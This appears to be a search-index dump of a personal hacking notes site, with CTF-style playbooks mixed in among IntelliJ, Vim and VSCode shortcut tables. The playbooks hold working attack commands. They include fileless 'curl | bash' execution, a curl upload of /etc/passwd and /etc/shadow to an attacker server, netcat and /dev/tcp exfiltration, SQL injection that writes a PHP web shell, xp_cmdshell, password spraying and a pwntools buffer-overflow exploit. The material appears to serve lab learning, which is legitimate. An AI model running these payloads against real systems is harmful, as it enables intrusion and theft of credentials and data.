","version":"Next","tagName":"h2"},{"title":"Samba​","type":1,"pageTitle":"File transfer","url":"/docs/playbooks/file-transfer#samba","content":" Start a impacket samba server on the attacker machine:  sudo impacket-smbserver share -smb2support /tmp/smbshare sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test   Note: the folder will not be created automatically, so you might want to create it beforehand.  Then to download a file from the attack machine to the target machine:  copy \\\\192.168.220.133\\share\\nc.exe   Or to upload a file from the target machine to the attack machine  copy upload_win.txt \\\\192.168.220.133\\share   If the samba ports are blocked, it's worth trying with WebDAV which runs SMB over HTTP.  Attacker machine:  sudo pip install wsgidav cheroot sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous   Target machine:  dir \\\\192.168.49.128\\DavWWWRoot copy C:\\Users\\john\\Desktop\\SourceCode.zip \\\\192.168.49.129\\sharefolder\\   Note: `DavWWWRoot`` is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.  You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \\192.168.49.128\\sharefolder  ","version":"Next","tagName":"h2"},{"title":"ftp​","type":1,"pageTitle":"File transfer","url":"/docs/playbooks/file-transfer#ftp","content":" Start a FTP server in the attacker:  sudo pip3 install pyftpdlib sudo python3 -m pyftpdlib --port 21   By default it will try to run at port 2121, so we need to explicitly say port 21 (and sudo).  At the target machine, we can use powershell cmdlet:  (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\\Users\\Public\\ftp-file.txt')   If the shell is not interactive, we'll need to create a file with the FTP commands, e.g.:  C:\\htb&gt; echo open 192.168.49.128 &gt; ftpcommand.txt C:\\htb&gt; echo USER anonymous &gt;&gt; ftpcommand.txt C:\\htb&gt; echo binary &gt;&gt; ftpcommand.txt C:\\htb&gt; echo GET file.txt &gt;&gt; ftpcommand.txt C:\\htb&gt; echo bye &gt;&gt; ftpcommand.txt C:\\htb&gt; ftp -v -n -s:ftpcommand.txt ftp&gt; open 192.168.49.128 Log in with USER and PASS first. ftp&gt; USER anonymous ftp&gt; GET file.txt ftp&gt; bye C:\\htb&gt;more file.txt This is a test file   ","version":"Next","tagName":"h2"},{"title":"wget​","type":1,"pageTitle":"File transfer","url":"/docs/playbooks/file-transfer#wget","content":" wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh # fileless wget wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3   ","version":"Next","tagName":"h2"},{"title":"curl​","type":1,"pageTitle":"File transfer","url":"/docs/playbooks/file-transfer#curl","content":" curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh # fileless curl curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash   ","version":"Next","tagName":"h2"},{"title":"nc​","type":1,"pageTitle":"File transfer","url":"/docs/playbooks/file-transfer#nc","content":" nc -lvnp 9002 &gt; SharpKatz.exe #Inside receiver nc -q 0 192.168.49.128 9002 &lt; SharpKatz.exe #In sender   ","version":"Next","tagName":"h2"},{"title":"dev/tcp​","type":1,"pageTitle":"File transfer","url":"/docs/playbooks/file-transfer#devtcp","content":" As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.  exec 3&lt;&gt;/dev/tcp/10.10.10.32/80 echo -e &quot;GET /LinEnum.sh HTTP/1.1\\n\\n&quot;&gt;&amp;3 cat &lt;&amp;3 cat metabase.db.trace.db &gt; /dev/tcp/10.10.14.102/9002 # Send the file cat &lt; /dev/tcp/192.168.49.128/443 &gt; SharpKatz.exe # Receive the file   ","version":"Next","tagName":"h2"},{"title":"python​","type":1,"pageTitle":"File transfer","url":"/docs/playbooks/file-transfer#python","content":" Attacker machine runs HTTP(s) server  sudo python3 -m pip install --user uploadserver python3 -m http.server 5555 sudo python3 -m uploadserver 443 --server-certificate /root/server.pem   Target machine uploads file:  curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure   ","version":"Next","tagName":"h2"},{"title":"Self-signed certificate​","type":1,"pageTitle":"File transfer","url":"/docs/playbooks/file-transfer#self-signed-certificate","content":" openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'   ","version":"Next","tagName":"h2"},{"title":"Living off The Land​","type":1,"pageTitle":"File transfer","url":"/docs/playbooks/file-transfer#living-off-the-land","content":" You can abuse of binaries supposed to perform an action to escape from some prohibited binaries. This is same concept as the privilege escalation using GTFObins.  You can use:  https://lolbas-project.github.io/# for windowshttps://gtfobins.github.io/ for Linux  For example, for Windows we can use certreq.exe:  certreq.exe -Post -config http://192.168.49.128/ c:\\windows\\win.ini   For example in Linux, you can abuse openssl:  On attacker:  openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem &lt; /tmp/LinEnum.sh   On target:  openssl s_client -connect 10.10.10.32:80 -quiet &gt; LinEnum.sh  ","version":"Next","tagName":"h2"},{"title":"IntelliJ","type":0,"sectionRef":"#","url":"/docs/Shortcuts/IntelliJ","content":"IntelliJ Shortcut\tDescriptionMove between open projects\toption + CMD + ` Open terminal\toption + fn + F12 Select\toption + Arrow Up/Down Move between words\toption + Arrow Left/Right Fold\tCMD (+) + Unfold\tCMD (+) - Search and replace\tCMD+R + option +A Project structure section\tCMD+1 Run section\tCMD+4 Go to line\tCMD+L See implementations\toption+CMD+B See usages\tCMD+B Move\tF6 Rename\tSHIT + F6 Go to test\tSHIT + CMD + T Recent files\tCMD + E Add breakpoint\tCMD + F8 Run\tCONTROL + SHIFT + R Debug\tCONTROL + SHIFT + D Delete line\tCMD + Erase","keywords":"","version":"Next"},{"title":"OWASP TOP 10","type":0,"sectionRef":"#","url":"/docs/playbooks/owasp","content":"","keywords":"","version":"Next"},{"title":"Broken Access Control​","type":1,"pageTitle":"OWASP TOP 10","url":"/docs/playbooks/owasp#broken-access-control","content":" https://owasp.org/Top10/A01_2021-Broken_Access_Control  Malicious users can manipulate access control mechanisms.  Examples of this are:  Modify the loging cookie to change from regular user to admin userManipulate JWT Tokens...  ","version":"Next","tagName":"h2"},{"title":"Cryptographic Failures​","type":1,"pageTitle":"OWASP TOP 10","url":"/docs/playbooks/owasp#cryptographic-failures","content":" https://owasp.org/Top10/A02_2021-Cryptographic_Failures/  Examples of this are:  Using old ciphers in symmetric encryptionUsing short keys for RSA key: able to generate the private key from the public keyUnsalted passwords...  ","version":"Next","tagName":"h2"},{"title":"Injection​","type":1,"pageTitle":"OWASP TOP 10","url":"/docs/playbooks/owasp#injection","content":" https://owasp.org/Top10/A03_2021-Injection/  When the user can input some value to the application, the developers should pay extra attention to validate or sanitize it. Otherwise, a malicious user can inject any value on it.  Examples are:  SQL injections: break the SQL query syntax to execute arbitrary queriesOS injections: being able to execute OS commands via the user inputServer-side template injection: abuse a template engine to inject any code...  The injection can be reflected on the screen: the typical use case is for login. You log in with made up username and you see the username back in the UI. This helps a lot because you can test with attack attempts.  If you don't see the results back, you can try 2 things:  Write to a public file: if the target has a public endpoint, you can make the injection to write to a file in that public directory to extract the data.Out of band interaction: if you own a server, you can make the target connect to that server to exfiltrate the dataAbuse of the errors: if you see the stacktrace, you can use it in your favour and throw errors containg the information you want to extract.  ","version":"Next","tagName":"h2"},{"title":"Insecure Design​","type":1,"pageTitle":"OWASP TOP 10","url":"/docs/playbooks/owasp#insecure-design","content":" https://owasp.org/Top10/A04_2021-Insecure_Design/  Examples of this are:  Bot detection mechanismCredentials hardcoded in the code...  ","version":"Next","tagName":"h2"},{"title":"Security Misconfiguration​","type":1,"pageTitle":"OWASP TOP 10","url":"/docs/playbooks/owasp#security-misconfiguration","content":" https://owasp.org/Top10/A05_2021-Security_Misconfiguration/  This topic is very broad and might include things like:  Default users, passwordsUnprotected paths of the application (remember nginx off-by-slash vulnerability)Stack traces revealing information to the user  ","version":"Next","tagName":"h2"},{"title":"Vulnerable and Outdated Components​","type":1,"pageTitle":"OWASP TOP 10","url":"/docs/playbooks/owasp#vulnerable-and-outdated-components","content":" https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components  Using old libraries might cause the application to be vulnerable to new attacks that recent versions of the library fix  When you are exploring this attack vector, check the repository of the library (if open source) and look for commits for the next versions. If you see something looking like a security fix, it's worth trying to replicate it in your setup.  ","version":"Next","tagName":"h2"},{"title":"Identification and Authentication Failures​","type":1,"pageTitle":"OWASP TOP 10","url":"/docs/playbooks/owasp#identification-and-authentication-failures","content":" https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/  Examples:  Default/weak passwordAllowing brute force attacks to guess username/password  ","version":"Next","tagName":"h2"},{"title":"Software and Data Integrity Failures​","type":1,"pageTitle":"OWASP TOP 10","url":"/docs/playbooks/owasp#software-and-data-integrity-failures","content":" https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/  Application that relies on plugins, libraries, etc.. from third-party must verify the integrity of the component. This also applies to the user input.  If the user can see and modify a serialized payload, that payload should be handled with extra care.  Additionally, CI/CD pipeline must be well secured, otherwise the attackers might modified the shipped software.  ","version":"Next","tagName":"h2"},{"title":"Security Logging and Monitoring Failures​","type":1,"pageTitle":"OWASP TOP 10","url":"/docs/playbooks/owasp#security-logging-and-monitoring-failures","content":" https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures  Not enough monitoring for scenarios like excessive number of failed login attemps, etc...  ","version":"Next","tagName":"h2"},{"title":"Server-Side Request Forgery (SSRF)​","type":1,"pageTitle":"OWASP TOP 10","url":"/docs/playbooks/owasp#server-side-request-forgery-ssrf","content":" https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29  This happens when an application fetches a resource from a third-pary based on the input provided by a user.  For instance, in a template engine, the legitimate users might include an image stored in their webserver. However, an attacker might include their own crafted version of the image that includes malicious code. ","version":"Next","tagName":"h2"},{"title":"Vim","type":0,"sectionRef":"#","url":"/docs/Shortcuts/Vim","content":"","keywords":"","version":"Next"},{"title":"How to​","type":1,"pageTitle":"Vim","url":"/docs/Shortcuts/Vim#how-to","content":" ","version":"Next","tagName":"h2"},{"title":"Add text to multiple lines:​","type":1,"pageTitle":"Vim","url":"/docs/Shortcuts/Vim#add-text-to-multiple-lines","content":" Visual block modeSelect where to changePress IPerform the change in one linePress ESCThe change will propagate ","version":"Next","tagName":"h3"},{"title":"Digital Forensics and Incident Response","type":0,"sectionRef":"#","url":"/docs/Hacking/Playbooks/DFIR","content":"","keywords":"","version":"Next"},{"title":"auth.log and wtmp​","type":1,"pageTitle":"Digital Forensics and Incident Response","url":"/docs/Hacking/Playbooks/DFIR#authlog-and-wtmp","content":" The auth.log file is primarily used for tracking authentication mechanisms. Whenever a user attempts to log in, switch users, or perform any task that requires authentication, an entry is made in this log file. This includes activities involving sshd (SSH daemon), sudo actions, and cron jobs requiring authentication.  An example entry has been detailed below:  The entry above shows a failed password attempt for a user named &quot;admin&quot; on exampleserver from a source IP of 192.168.1.101 over port 22 (SSH).   auth.log is human readable.  The wtmp file logs all login and logout events on the system. It's a binary file, typically located at /var/log/wtmp . The last command can be used to read this file, providing a history of user logins and logouts, system reboots, and runlevel changes.  Since it's a binary file, it worth considering that the arch of the victim might be different from the arch of the researcher, so you might want to use some kind of script such as https://gist.github.com/4n6ist/99241df331bb06f393be935f82f036a5 to perform the research.  ","version":"Next","tagName":"h2"},{"title":"evtx​","type":1,"pageTitle":"Digital Forensics and Incident Response","url":"/docs/Hacking/Playbooks/DFIR#evtx","content":" Windows event logs are provided with evtx format. Is is a binary format, in order to read it and process it, you can use chainsaw and sigma-rules to detect possible threats.  https://github.com/WithSecureLabs/chainsaw a tool to search what happened inside Windows Forensic artifactshttps://github.com/SigmaHQ/sigma rules to detect threats  e.g:  ./chainsaw hunt ~/workspace/gal/htb/Sherlocks/Campfire-1/Triage/Domain\\ Controller -s ~/workspace/tools/sigma --mapping mappings/sigma-event-logs-all.yml -r ~/workspace/tools/sigma/rules --csv --output ~/workspace/gal/htb/Sherlocks/Campfire-1/Triage/Domain\\ Controller/chainsaw   and it can generate CSV output:  ./chainsaw hunt ~/workspace/gal/htb/Sherlocks/Campfire-1/Triage/Domain\\ Controller -s ~/workspace/tools/sigma --mapping mappings/sigma-event-logs-all.yml -r ~/workspace/tools/sigma/rules --csv --output ~/workspace/gal/htb/Sherlocks/Campfire-1/Triage/Domain\\ Controller/chainsaw   ","version":"Next","tagName":"h2"},{"title":"prefetch files​","type":1,"pageTitle":"Digital Forensics and Incident Response","url":"/docs/Hacking/Playbooks/DFIR#prefetch-files","content":" Windows can be configured to generate a file the first time a binary is executed. This can be very helpful while collecting evidences of attacks. You can analyze them on a Windows machine using the following tools from https://ericzimmerman.github.io/#!index.md:  -PECmd: analyze the prefetch files and outputs a CSV:  .\\PECmd.exe -d C:\\Users\\gal\\Desktop\\campfire1\\Workstation\\2024-05-21T033012_triage_asset\\ --csv . --csvf C:\\Users\\gal\\Desktop\\prefetch.csv  Timeline Explorer: Load the generated CSV and it will display the CSV data visually. ","version":"Next","tagName":"h2"},{"title":"crackmapexec","type":0,"sectionRef":"#","url":"/docs/tooling/crackmapexec","content":"","keywords":"","version":"Next"},{"title":"Brute-force Sambda users​","type":1,"pageTitle":"crackmapexec","url":"/docs/tooling/crackmapexec#brute-force-sambda-users","content":" Will try to determine the users of a system by trying with different `rid``  crackmapexec smb 10.10.11.236 -u anonymous -p &quot;&quot; --rid-brute 10000 &gt; u.txt   Now we can delete useless users:  cat u.txt |grep -i user |rev |cut -f2 -d ' ' |rev |grep FLUFFY |cut -f2 -d '\\' |grep -Ev (DC|SVC) |tail -n +4 &gt; users.txt   ","version":"Next","tagName":"h2"},{"title":"Password spraying​","type":1,"pageTitle":"crackmapexec","url":"/docs/tooling/crackmapexec#password-spraying","content":" It will try to combine the values in the provided files to see if it returns a valid login attempt  crackmapexec smb 10.10.11.236 -u exfil/users -p exfil/users  ","version":"Next","tagName":"h2"},{"title":"VSCode","type":0,"sectionRef":"#","url":"/docs/Shortcuts/VSCode","content":"VSCode Shortcut\tDescriptionGo to file\tCMD + P Go to terminal\tcontrol + ` Go to editor\tcontrol + 1,2,3,.. Search\tCMD + F Search-replace\toption + CMD + F Fold\tCMD + K + 0 Unfold\tCMD + K + J See all shortcuts\tCMD + K + S Go to explorer\tCMD + shift + e Multi-cursor search\tSelect the term to search and CMD + shift + L Duplicate line\tSHIFT + OPT + arro down","keywords":"","version":"Next"},{"title":"SQL Injections","type":0,"sectionRef":"#","url":"/docs/playbooks/sqli","content":"","keywords":"","version":"Next"},{"title":"Comments​","type":1,"pageTitle":"SQL Injections","url":"/docs/playbooks/sqli#comments","content":" When trying to make the SQL injection, remember that SQL has different comment characters: # and --. Mind the space in the last one, it's better to use -- - char for this kind of escape.  ","version":"Next","tagName":"h2"},{"title":"URL encode​","type":1,"pageTitle":"SQL Injections","url":"/docs/playbooks/sqli#url-encode","content":" If you are trying to discover a SQL injection and you fail, remember that you might need to use the URL-encoded characters:  Character\tURL Encoded Character'\t%27 &quot;\t%22 #\t%23 ;\t%3B )\t%29  ","version":"Next","tagName":"h2"},{"title":"Query logic​","type":1,"pageTitle":"SQL Injections","url":"/docs/playbooks/sqli#query-logic","content":" Remember you can subvert any query logic by using the AND and OR operators, e.g:  SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';   If you are free to input any value in admin you can ignore the AND:  SELECT * FROM logins WHERE username='admin'--' AND password = 'p@ssw0rd';   Another example, you can just not only ignore the conditions but change them:  SELECT * FROM logins WHERE ((username='admin') AND id &gt; 1) AND password = 'd41d8cd98f00b204e9800998ecf8427e'   username = other')) OR id=5'--  SELECT * FROM logins WHERE ((username='username = other')) OR id=5'--) AND id &gt; 1) AND password = 'd41d8cd98f00b204e9800998ecf8427e'   And you will log-in as user with ID 5  ","version":"Next","tagName":"h2"},{"title":"Union​","type":1,"pageTitle":"SQL Injections","url":"/docs/playbooks/sqli#union","content":" You can abuse the SQL injection to extract info from any table using the UNION clause. You just need to know the number of columns.  You can combine the outputs of two tables provided they have the same number of columns.  In order to know the number of columns, you can use the following methods:  Order by: you can pass the number of column to sort by: 1,2,3, keep trying until you got an error. That's the number of columns. Union: similar to the last one but provide the colums to a union query: UNION select 1,2,3. When it fails, you'll know the max number of columns.  This last method provides the benefit that you see in the UI if there are some hidden column.  ","version":"Next","tagName":"h2"},{"title":"Enumerating through SQL injection​","type":1,"pageTitle":"SQL Injections","url":"/docs/playbooks/sqli#enumerating-through-sql-injection","content":" You can extract the information in the database via SQL injection. However, first you must know the databases inside, the tables and the structure of them.  No worries, you can make use of the table metadata to obtain this information:  ","version":"Next","tagName":"h2"},{"title":"Databases​","type":1,"pageTitle":"SQL Injections","url":"/docs/playbooks/sqli#databases","content":" All available databases  SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;   Current database  select 1,database(),2,3-- -   ","version":"Next","tagName":"h3"},{"title":"Tables​","type":1,"pageTitle":"SQL Injections","url":"/docs/playbooks/sqli#tables","content":" All available tables in database dev  select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'   ","version":"Next","tagName":"h3"},{"title":"Table columns​","type":1,"pageTitle":"SQL Injections","url":"/docs/playbooks/sqli#table-columns","content":" All available columns in table 'credentials'  select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'   ","version":"Next","tagName":"h3"},{"title":"User privileges​","type":1,"pageTitle":"SQL Injections","url":"/docs/playbooks/sqli#user-privileges","content":" In certain conditions the user might be authorized to read/write files from the database. First of all you need to know the privileges of the current user:  To know the user running the database:  SELECT 1, user(), 3, 4   Check if the user is a super-user:  SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user=&quot;root&quot;   List all privileges of user:  SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee=&quot;'root'@'localhost'&quot;   ","version":"Next","tagName":"h2"},{"title":"Reading​","type":1,"pageTitle":"SQL Injections","url":"/docs/playbooks/sqli#reading","content":" If FILE privilege is granted for the user, you might be able to read any system file from the database engine:  SELECT LOAD_FILE('/etc/passwd'); SELECT 1, LOAD_FILE(&quot;/var/www/html/search.php&quot;), 3, 4   This will work provided the user running the database has read access in the OS.  You can use TO_BASE64 function for convinience:  SELECT 1, TO_BASE64(LOAD_FILE(&quot;/var/www/html/config.php&quot;)), 3, 4   And later decode it:  cat /tmp/b.txt | tr -d ' ' | base64 -d &gt; /tmp/b.php   Note that displaying the base64 added some whitespaces which base64 command dislikes. You can use tr to remove those chars.  ","version":"Next","tagName":"h3"},{"title":"Writing​","type":1,"pageTitle":"SQL Injections","url":"/docs/playbooks/sqli#writing","content":" There are some requirements to be able to write a file from the database:  FILE privilegeGlobal secure_file_priv variable not enabledThe user running the database must have write access to the destination  You can check the global variable with a query like:  SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name=&quot;secure_file_priv&quot;   If the conditions are met, writing to a file is simple:  select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'   Then, you can try more advanced stuff, like writing a web shell:  select &quot;&quot;,'&lt;?php system($_REQUEST[0]); ?&gt;', &quot;&quot;, &quot;&quot; into outfile '/var/www/html/shell.php'   The attacker might run this web-shell from http://SERVER_IP:PORT/shell.php?0=id ","version":"Next","tagName":"h3"},{"title":"hashcat","type":0,"sectionRef":"#","url":"/docs/tooling/hashcat","content":"hashcat Determine type of hash: hashcat exfil/hash.txt ... # | Name | Category ======+============================================================+====================================== 3200 | bcrypt $2*$, Blowfish (Unix) | Operating System 25600 | bcrypt(md5($pass)) / bcryptmd5 | Forums, CMS, E-Commerce 25800 | bcrypt(sha1($pass)) / bcryptsha1 | Forums, CMS, E-Commerce 28400 | bcrypt(sha512($pass)) / bcryptsha512 | Forums, CMS, E-Commerce -m defines the type of hash -a 0 means dictionary attack hashcat exfil/hash.txt -m 3200 -a 0 /usr/share/wordlists/rockyou.txt ","keywords":"","version":"Next"},{"title":"ms-sql","type":0,"sectionRef":"#","url":"/docs/tooling/ms-sql","content":"ms-sql Connect with impacket-mssqlclient.py: mssqlclient.py manager.htb/operator:operator@dc01.manager.htb -windows-auth Show databases SELECT name, database_id, create_date FROM sys.databases; Show tables SELECT name FROM sys.tables; Check if we have permission to run xp_* EXEC sp_helprotect 'xp_cmdshell' EXEC sp_helprotect 'xp_dirtree' Execute code EXEC xp_cmdshell whoami List files EXEC xp_dirtree '\\\\&lt;attacker_IP&gt;\\any\\thing' EXEC xp_dirtree 'C:\\inetpub\\wwwroot', 1, 1; ","keywords":"","version":"Next"},{"title":"johntheripper","type":0,"sectionRef":"#","url":"/docs/tooling/john-the-ripper","content":"johntheripper https://github.com/openwall/john Password cracking tool. It does not do anything magic, it just compares a hash file with a list of words (dictionary). It has a quite decent default dictionary, however, you can search for more complete dictionaries such as the rock-you.txt Make sure to install a version &gt;= 1.9.0, which enables support for many hash formats. In my case for 1.8.0 version I couldn't crack a NTLMv2 hash. You can also use zip2john tool to brute-force zip files with passwords. You can specify the format as well: john --format=raw-md5 passwd.txt You can determine the type of hash by running hashid and then check with: john --list=formats ","keywords":"","version":"Next"},{"title":"Reversing","type":0,"sectionRef":"#","url":"/docs/playbooks/reversing","content":"","keywords":"","version":"Next"},{"title":"Buffer overflow​","type":1,"pageTitle":"Reversing","url":"/docs/playbooks/reversing#buffer-overflow","content":" In order to understand this attack, first we need to understand how the memory works in the computers.  We first need to understand that memory has the following regions:  Memory section\tDescriptionStack\tstores function local variables and information about function calls: return address, arguments, etc.. Heap\tstores the dynamic memory. Used by malloc, etc... BSS\tstores the uninitialized static/global variables Data\tstores the static/global variables Text\tread only, stores the executable code  Inside the stack, a new stack frame is created for every function execution. Inside a stack frame, we can see:  Stack frame section\tDescriptionFunction arguments Return address\twhere to go when the execution ends Previous frame pointer\tto know what is the stack frame of the function calling this function Local variables\t  Take this functions as example:  #include &lt;string.h&gt; void foo(char *str) { char buffer[12]; /* The following statement will result in buffer overflow */ strcpy(buffer, str); } int main() { char *str = &quot;This is definitely longer than 12&quot;; foo(str); return 1; }   The stack frame for foo() will look like this:  Stack frame section\tValueFunction arguments\tstr (pointer) Return address Previous frame pointer Local variables\tbuffer[11] ... buffer[1]  In this case, we can keep adding data into the buffer until we reach the memory address of the return address. Then, we can tell the program to jump to any function that we want.  Knowing that, buffer overflow technique consists in three stages:  ","version":"Next","tagName":"h2"},{"title":"Overflow the stack pointer​","type":1,"pageTitle":"Reversing","url":"/docs/playbooks/reversing#overflow-the-stack-pointer","content":" When a function does not limit the input characters, it can happen that the user inputs more bytes than the expected, e.g: gets function:  void vuln(void) { char local_bc [180]; gets(local_bc); puts(local_bc); return; }   In this case, if the user inputs 200 chars, the program will fail with segmentation fault and the data will be injected in some unknown region of the stack.  ","version":"Next","tagName":"h3"},{"title":"Reach to the return address​","type":1,"pageTitle":"Reversing","url":"/docs/playbooks/reversing#reach-to-the-return-address","content":" Knowing that the function is vulnerable to buffer overflow, we can craft a special payload that change the return address to make it jump where we want.  In order to do this, the first thing we need to do is find the offset on the input data in order to write to the return address.  Using ghidra we can find easily the value of the return function as it will be the next instruction just after the invocation to our target function, so you will need to calculate the payload using those values.  You can do it in a less manual way using gdb-peda:  Knowing that the buffer has 180 chars, let's suppose that will 200 chars will overflow it, let's create a pattern of 200 chars:  pattern_create 200 bof.txt  and input it to the program:  r &lt; pattern.txt  When the program crashes, we'll see the registers:  You know who are 0xDiablos: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA Program received signal SIGSEGV, Segmentation fault. [----------------------------------registers-----------------------------------] EAX: 0xc9 EBX: 0x76414158 ('XAAv') ECX: 0xf7fa09b4 --&gt; 0x0 EDX: 0x1 ESI: 0xffffcf94 --&gt; 0xffffd165 (&quot;/home/gal/workspace/hack-the-box/boxes/you-know-0x-diables/vuln&quot;) EDI: 0xf7ffcb80 --&gt; 0x0 EBP: 0x41594141 ('AAYA') ESP: 0xffffceb0 (&quot;ZAAxAAyA&quot;) EIP: 0x41417741 ('AwAA') EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] Invalid $PC address: 0x41417741 [------------------------------------stack-------------------------------------] 0000| 0xffffceb0 (&quot;ZAAxAAyA&quot;) 0004| 0xffffceb4 (&quot;AAyA&quot;) 0008| 0xffffceb8 --&gt; 0xf7fbeb00 --&gt; 0xf7d8fcd4 (&quot;GCC_3.0&quot;) 0012| 0xffffcebc --&gt; 0x3e8 0016| 0xffffcec0 --&gt; 0xffffcee0 --&gt; 0x1 0020| 0xffffcec4 --&gt; 0xf7f9f000 --&gt; 0x229dac 0024| 0xffffcec8 --&gt; 0xf7ffd020 --&gt; 0xf7ffda40 --&gt; 0x0 0028| 0xffffcecc --&gt; 0xf7d96519 --&gt; 0x8310c483 [------------------------------------------------------------------------------] Legend: code, data, rodata, value 0x41417741 in ?? ()   The interesting one is EIP as it is the register that points to the next instruction. Note that if you change the payload, the value of the EIP pointer will change as well.  Now, we can use pattern_offset to obtain exactly the number of characters to reach to Return address:  gdb-peda$ pattern_offset 0x41417741 1094809409 found at offset: 188   Now we know that if we write exactly 188 chars, the next content will be written to the return address and we can make the program jump to where we want.  ","version":"Next","tagName":"h3"},{"title":"Write the exploit​","type":1,"pageTitle":"Reversing","url":"/docs/playbooks/reversing#write-the-exploit","content":" In the case I'm working on the exploit just need to call another function in the code. In order to so, I'll use python pwntools which helps a lot on these kind of things.  from pwn import * context.update(arch=&quot;i386&quot;, os=&quot;linux&quot;) elf = ELF(&quot;./vuln&quot;) # offset to reach right before return address's location offset = b&quot;A&quot; * 188 # craft exploit: offset + flag() + padding + parameter 1 + parameter 2 exploit = offset + p32(elf.symbols['flag'], endian=&quot;little&quot;) + p32(0x90909090) + p32(0xdeadbeef, endian=&quot;little&quot;) + p32(0xc0ded00d, endian=&quot;little&quot;) r = elf.process() r.sendlineafter(&quot;:&quot;, exploit) r.interactive()   Remember that we are jumping to flag() using RET. This means flag() will think itself have a return address. Therefore, we should pad with any 4 bytes of content before we write the 2 parameters.  ","version":"Next","tagName":"h3"},{"title":"Obfuscated code​","type":1,"pageTitle":"Reversing","url":"/docs/playbooks/reversing#obfuscated-code","content":" Sometimes, when trying to reverse the code, you might see strings that look very odd, e.g:  3734203635203636203132322036352036382034382036352037342031  This might be some string buf obfuscated somehow. So far, I found this kind of simple de-obfuscation (the plan is to keep updating this with more obfuscation techniques):  ","version":"Next","tagName":"h2"},{"title":"Hex to DEC > DEC to char > decode all string in base64​","type":1,"pageTitle":"Reversing","url":"/docs/playbooks/reversing#hex-to-dec--dec-to-char--decode-all-string-in-base64","content":" import binascii import base64 def dec_to_chr(str): return &quot;&quot;.join([chr(int(s)) for s in str.decode('utf-8').split(' ')]) base64text = &quot;&quot; base64text += dec_to_chr(binascii.unhexlify(&quot;3734203635203636203132322036352036382034382036352037342031&quot;) + binascii.unhexlify(&quot;31392036352035312036352036382039392036352037362031303320363520353120363520363820383120363520373620313033&quot;)) base64text += dec_to_chr(binascii.unhexlify(&quot;3635203631&quot;)) print(base64.b64decode(base64text).decode()) $s='77.74.   In this case, this looks like the begining of a script trying to connect to an IP address.  ","version":"Next","tagName":"h3"},{"title":"String format vulnerability​","type":1,"pageTitle":"Reversing","url":"/docs/playbooks/reversing#string-format-vulnerability","content":" Some pieces of unsecure code, will print whatever the user is coding, see:  __isoc99_scanf(&quot;%299s&quot;,local_148); printf(local_148);   If we're a malicious user, can use that piece of code to leak memory addresses from the stack simply by using string format: %p,%p,%p will leak the first three memory positions in the stack: 0x1,0x1,0x7ffff7d14a37  More info here https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/  More possible formats: https://en.wikipedia.org/wiki/Printf_format_string  ","version":"Next","tagName":"h2"},{"title":"Security flags​","type":1,"pageTitle":"Reversing","url":"/docs/playbooks/reversing#security-flags","content":" When a binary is generated, there are some flags that can be setup for security reasons, here are listed. To check it you can use checksec:  gal@gal-Modern-14-C12M:~/workspace/gal/blog$ checksec /usr/bin/ls [*] '/usr/bin/ls' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled   RELRO: If there's no RELRO protection, it means that the Global Object Table (GOT) is writtable. The GOT contains the memory address of the standard library methods. If you can override this, it means that when computer executes puts, an attack can change the table to make it execute arbitrary code.Stack: canary found, it means it hard to crash and gain code execution via buffer overflow.NX: No code execution from the stackPIE: executable is loaded at random address.  More info https://opensource.com/article/21/6/linux-checksec  ","version":"Next","tagName":"h2"},{"title":"ASLR: Address Space Layout Randomisation​","type":1,"pageTitle":"Reversing","url":"/docs/playbooks/reversing#aslr-address-space-layout-randomisation","content":" This is a technique used to avoid memory corruption attacks. In order to prevent an attacker from reliably jumping to, for example, a particular exploited function in memory, ASLR randomly arranges the address space positions of key data areas of a process, including the base of the executable and the positions of the stack, heap and libraries.  In order to check if a exploit is stable and will work even with ASLR enabled, you can enable it in gdb:  gef➤ aslr on [+] Enabling ASLR gef➤ start   